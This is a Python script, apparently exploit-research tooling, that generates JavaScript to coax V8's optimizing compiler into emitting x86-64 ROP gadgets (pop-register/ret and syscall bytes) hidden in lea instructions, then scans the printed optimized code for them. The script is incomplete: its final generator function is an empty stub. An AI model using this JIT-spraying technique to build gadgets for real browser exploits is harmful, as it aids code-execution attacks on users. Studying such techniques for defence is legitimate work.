import os
import re
import sys
import pathlib


gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
# 48 8d 5a c3             lea    rbx,[rdx-0x3d]
# 48 8d 5e c3             lea    rbx,[rsi-0x3d]
# 48 8d 58 c3             lea    rbx,[rax-0x3d]
# 48 8d 5f c3             lea    rbx,[rdi-0x3d]
rs_set = {('rbx', 'rdx'), ('rbx', 'rsi'), ('rbx', 'rax'), ('rbx', 'rdi')}
exec_path = ''
count = 12


def get_registers(log:str):
    f = open(log, 'r')
    base = 110
    nums = []
    for i in range(base, base + count):
        nums.append('0x' + str(i))

    lines = f.readlines()
    mm = dict()
    for line in lines:
        for num in nums:
            if line.rfind(num) != -1 and line.find(',') != -1:
                if line.find('leal') != -1:
                    mm[line[line.rfind('r'):line.rfind('+')]] ='var' + str(int(num[2:]) - base)
                    mm[line[line.find('r'):line.find(',')]] = 't' + str(int(num[2:]) - base)
                else:
                    mm[line[line.rfind('r'):line.rfind(',')]] = 'var' + str(int(num[2:]) - base)
                break
    return mm

def excute_js(js:str, filename:str)->bool:
    f = open(filename + '.js', 'w')
    f.write(js)
    f.close()
    os.system(exec_path + ' --print-opt-code ' + filename + '.js > ' + filename + '.txt')
    f = open(filename + '.txt', 'r')
    lines = f.readlines()
    f.close()
    for line in lines:
        for jsc in gadgets:
            if line.find('lea') != -1 and line.find(jsc) != -1:
                words = line.split()
                if len(words) > 3 and words[2].find(jsc) != -1 and words[2].find(jsc) % 2 == 0:
                    gadgets.remove(jsc)
                    return True
    
    return False

def generate_template(count:int):
    header = '''
var array = new Uint8Array();
function jsc('''

    for i in range(count - 1):
        header += 'var' + str(i) + ', '
    header += 'var' + str(count - 1) + '){\n'
    base = 110
    middle1 = ''
    idx = 0
    for i in range(count):
        var = 't' + str(idx)
        middle1 += '\tvar ' + var + ' = var' + str(i) + ' + 0x' + str(base) + ';\n'
        base += 1
        idx += 1

    middle2 = '\treturn '
    ops = ['&', '^', '|']
    for i in range(idx - 1):
        middle2 += 't' + str(i) + ' ' + '& '
    middle2 += 't' + str(idx-1) + ';\n}\n'

    tail = '''
for(var i = 0; i < 0x10000; i++)
{
'''
    tail += '\tjsc('
    for i in range(count - 1):
        tail += '0xc' + str(i) + ', '
    tail += '0xc' + str(count - 1) + ');'
    tail += '\n}\n'

    excute_js(header + middle1 + middle2 + tail, 'test')

def gen_jsc(r1:str, r2:str):
    base = 110
    jsc = '\tvar s = t' + str(int(rs_map[r1]) - base) + ' + t' + str(int(rs_map[r2]) - base) + ' * 2 + 0xc3;\n'
    jsc += '\treturn '
    l = False
    for i in range(count):
        if i != int(rs_map[r1]) - base and i != int(rs_map[r2]) - base:
            if l:
                jsc += ' + '
            jsc += 't' + str(i)
            l = True
    jsc += ' | s;\n'
    return jsc

def gen_syscall(r1:str, r2:str):
    base = 110
    jsc = '\tvar s = t' + str(int(rs_map[r1]) - base) + ' + t' + str(int(rs_map[r2]) - base) + ' * 1 + 0x5;\n'
    jsc += '\treturn '
    l = False
    for i in range(count):
        if i != int(rs_map[r1]) - base and i != int(rs_map[r2]) - base:
            if l:
                jsc += ' + '
            jsc += 't' + str(i)
            l = True
    jsc += ' | s;\n'
    return jsc

def generate_js(filename:str):
    f = open(filename, 'r')
    lines = f.readlines()
    header = ''
    i = 0
    while i < len(lines):
        if lines[i].find('\tvar s') == -1:
            header += lines[i] 
        else:
            i += 2
            break
        i += 1
    tail = ''
    while i < len(lines):
        tail += lines[i]
        i += 1

    base = 110

    # 48 8d 5a c3             lea    rbx,[rdx-0x3d]
    # 48 8d 5e c3             lea    rbx,[rsi-0x3d]
    # 48 8d 58 c3             lea    rbx,[rax-0x3d]
    # 48 8d 5f c3             lea    rbx,[rdi-0x3d]
    
    
    out = open('jsc.js', 'w')
    # write jsc function



if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('plese input the path of v8')
        exit()
    
    exec_path = sys.argv[1]
    p = pathlib.Path(exec_path)
    if not p.is_file():
        print('path of v8 error')
        exit()

    count = 12
    generate_template(count)
    rs_map = get_registers('test.txt')
    
    print(rs_map)
    if not rs_set < set(rs_map.keys()):
        print('needed ', rs_set)
        print('has', set(rs_map.keys()))
        print('resgister are not enough')
        exit()